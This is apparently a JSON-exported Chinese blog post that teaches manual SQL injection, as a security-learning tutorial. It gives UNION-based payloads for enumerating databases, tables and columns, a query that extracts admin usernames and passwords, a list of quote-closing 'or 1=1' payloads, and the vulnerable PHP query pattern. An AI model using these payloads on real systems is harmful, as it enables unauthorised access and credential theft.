{"title":"简要SQL注入","uid":"7636cfd8370edb30f65feb72ed748040","slug":"简要SQL注入","date":"2022-01-30T13:05:54.000Z","updated":"2022-02-13T15:48:59.624Z","comments":true,"path":"api/articles/简要SQL注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SQL 注入漏洞是重点部分，其中 SQL 注入 又非常复杂，区分各种数据库类型，提交方法，数据类型等注入等，此类漏洞是 WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复。</p>\n<h2 id=\"SQL注入图解\"><a href=\"#SQL注入图解\" class=\"headerlink\" title=\"SQL注入图解\"></a>SQL注入图解</h2><p><img src=\"/post/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5.htm/image-20220130212558105.png\" alt=\"image-20220130212558105\"></p>\n<h2 id=\"手工注入原理\"><a href=\"#手工注入原理\" class=\"headerlink\" title=\"手工注入原理\"></a>手工注入原理</h2><p>手工注入：<br>构造不同的sql语句，用户输入的数据拼接到原本的语句之后带入数据库执行。</p>\n<p>数据库各种各样，但是：都用sql语句调用<br>  （不同的数据库，同样的操作，语句会有些许些许不同）<br><strong>这些不同可以让我们判断目标网站是什么类型的数据库。</strong></p>\n<p><strong>一、判断注入点</strong><br>id&#x3D;1’在1后面加上单引号，页面出错</p>\n<p>id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误</p>\n<p>使用–注释时，需要使用空格，才能形成有效的sql语句，<br>而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。</p>\n<p>不加空格，–直接和系统自动生成的单引号连接在了一起，</p>\n<p>会被认为是一个关键词，无法注释掉系统自动生成的单引号。</p>\n<p><strong>二、判断字段数</strong><br>order by：ORDER BY语句用于根据指定的列对结果集进行排序</p>\n<p><strong>三、判断回显点</strong><br>union联合 合并：将多条查询语句的结果合并成一个结果</p>\n<p>group_concat()函数：查出库中所有的表</p>\n<p><strong>四、查询相关内容</strong><br>猜询数据库版本<br>and 1&#x3D;2 union select 1,version()</p>\n<p>猜询数据库</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;2 union select 1,schema_name from information_schema.tables limit 0，1（...）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;2 union select 1,(select group_concat(schema_name) from           information_schema.tables)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>schema_name字段中存放着所有数据库名</strong><br><strong>table_schema字段中存储着对应的数据库</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select schema_name from information_schema.schemata<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>select database();查看当前所在的库</p>\n<p>猜询表名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;2 union select 1,table_name  from  information_schema.tables where table_schema&#x3D;database() limit 1,1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;2 union select 1,(select group_cancat(column_name) from information_schema.tables where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>【table_name字段中存储着对应的表名】<br>【column_name字段中存储着对应的值】</p>\n<p>查询字段内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and 1&#x3D;2 union select 1,cancat(username,&#39;,&#39;,password) from admin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改库名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">rename database 库名  to  新库名；<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改列名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">alter table 库名 change column 旧列名 新列名 DATATIME（加类型）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改列的类型或约束</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">alter table 库名 modify column 旧列名 TIMESTAMP；（修改类型）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><ol>\n<li>version()——MySQL 版本 </li>\n<li>user()——数据库用户名 </li>\n<li>database()——数据库名 </li>\n<li>@@datadir——数据库路径 </li>\n<li>@@version_compile_os——操作系统版本</li>\n<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>\n<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>\n<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>\n</ol>\n<h2 id=\"一般注入的语句\"><a href=\"#一般注入的语句\" class=\"headerlink\" title=\"一般注入的语句\"></a>一般注入的语句</h2><p>or 1&#x3D;1–+ </p>\n<p>‘or 1&#x3D;1–+ </p>\n<p>“or 1&#x3D;1–+ </p>\n<p>)or 1&#x3D;1–+ </p>\n<p>‘)or 1&#x3D;1–+ </p>\n<p>“) or 1&#x3D;1–+ </p>\n<p>“))or 1&#x3D;1–</p>\n<p>其源码一般为：</p>\n<p>$id&#x3D;$_GET[‘id’]; </p>\n<p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”</p>\n<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>\n<p><strong>逻辑运算的举例</strong>：</p>\n<p>①Select * from users where id&#x3D;1 and 1&#x3D;1; </p>\n<p>②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1; </p>\n<p>③Select * from users where id&#x3D;1 &amp; 1&#x3D;1; </p>\n<p>上述三者有什么区别？</p>\n<p>①和②是一样的，表达的意思是 id&#x3D;1 条件和 1&#x3D;1 条件进行与运算。③的意思是 id&#x3D;1 条件与 1 进行&amp;位操作，id&#x3D;1 被当作 true，与 1 进行 &amp; 运算 结果还是 1， 再进行&#x3D;操作，1&#x3D;1,还是 1（ps：&amp;的优先级大于&#x3D;）</p>\n<p><strong>完整的注入流程：</strong></p>\n<p>猜数据库 </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select schema_name from information_schema.schemata <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>猜某库的数据表 </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>猜某表的所有列 </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n","text":"[TOC] 前言SQL 注入漏洞是重点部分，其中 SQL 注入 又非常复杂，区分各种数据库类型，提交方法，数据类型等注入等，此类漏洞是 WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复。 SQL注入图解 手工注入原理手工注入：构造不同的sql语句，用户输入的数据拼接到原本的...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5%E5%9B%BE%E8%A7%A3\"><span class=\"toc-text\">SQL注入图解</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">手工注入原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">常用函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E8%88%AC%E6%B3%A8%E5%85%A5%E7%9A%84%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">一般注入的语句</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-字符&数字型","uid":"35084a956f4a822fbd12f304f8c336a2","slug":"Less1-Less4","date":"2022-01-30T15:59:34.000Z","updated":"2022-12-24T04:22:16.654Z","comments":true,"path":"api/articles/Less1-Less4.json","keywords":null,"cover":[],"text":"[TOC] ###Less-1（字符型注入） 0x00首先注入： ?id&#x3D;1 正常返回结果 由于要判断注入点，如图： 添加 ‘ 报错，证明有注入点，字符型，id&#x3D;1’报错是由于源码当中接收值的时候本身自己就是id&#x3D;’’的闭合形式，但由于我们自己强行在...","link":"","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"WEB漏洞知识点","uid":"cadd35667758fe128c74aec131ce6e19","slug":"WEB漏洞知识点","date":"2022-01-30T07:21:56.000Z","updated":"2022-02-13T15:47:15.060Z","comments":true,"path":"api/articles/WEB漏洞知识点.json","keywords":null,"cover":[],"text":"[TOC] ##前言 WEB层面涉及的漏洞关系到渗透过程中的方方面面，漏洞的危害等级以及影响的范围等，要明白各个漏洞的形成原理，并且要明白如何去发现，如何去利用。 常见漏洞原理 SQL注入：简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全...","link":"","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"基础知识","slug":"基础知识","count":8,"path":"api/categories/基础知识.json"}],"tags":[{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}